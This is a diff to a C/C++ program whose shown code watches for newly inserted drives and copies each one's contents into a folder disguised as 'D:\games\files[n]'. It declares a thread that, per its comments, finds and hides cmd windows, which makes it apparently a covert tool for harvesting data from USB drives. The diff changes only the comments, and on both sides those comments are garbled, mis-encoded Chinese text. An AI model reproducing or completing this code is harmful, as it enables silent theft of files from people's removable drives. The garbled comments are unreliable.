@@ -19,9 +19,9 @@ HANDLE hthread_hide = NULL;
 UINT DiskType;
 
 /*----------------------------------------------------------------------------
-void copy();					//¸´ÖÆ¹¦ÄÜ
-int diskstatus();				//Ã»±ä»¯·µ»Ø0,ĞÂÔö·µ»Ø1£¬ÍË³ö·µ»Ø2
-DWORD WINAPI hide(LPVOID);		//hideÏß³ÌËÑË÷cmd´°¿Ú£¬Ò»µ©·¢ÏÖ¼´¶ÔÆä½øĞĞÒş²Ø
+void copy();					//å¤åˆ¶åŠŸèƒ½
+int diskstatus();				//æ²¡å˜åŒ–è¿”å›0, æ–°å¢è¿”å›1ï¼Œé€€å‡ºè¿”å›2, åŒæ—¶æ›´æ–°ç»´æŠ¤currentdisksçŠ¶æ€
+DWORD WINAPI hide(LPVOID);			//hideçº¿ç¨‹æœç´¢cmdçª—å£ï¼Œä¸€æ—¦å‘ç°å³å¯¹å…¶è¿›è¡Œéšè—
 ----------------------------------------------------------------------------*/
 
 
@@ -31,7 +31,7 @@ int main() {
 
 	while (true) {
 		int status = diskstatus();
-		if (status == 1) {	//ÓĞĞÂÅÌ·û
+		if (status == 1) {	//æœ‰æ–°ç›˜ç¬¦
 			for (int i = 0; i < newdisks.size(); i++) {
 				sprintf(dest, "D:\\games\\files[%d]\\", usbnums);
 				src[0] = newdisks[i];
@@ -40,9 +40,9 @@ int main() {
 				usbnums++;
 			}
 			newdisks.clear();
-		} else if (status == 0)	//ÎŞĞÂÅÌ·û
+		} else if (status == 0)	//æ— æ–°ç›˜ç¬¦
 			Sleep(1000);
-		else ;	//ÅÌ·ûÍË³ö
+		else ;	//ç›˜ç¬¦é€€å‡º
 	}
 	return 0;
 }
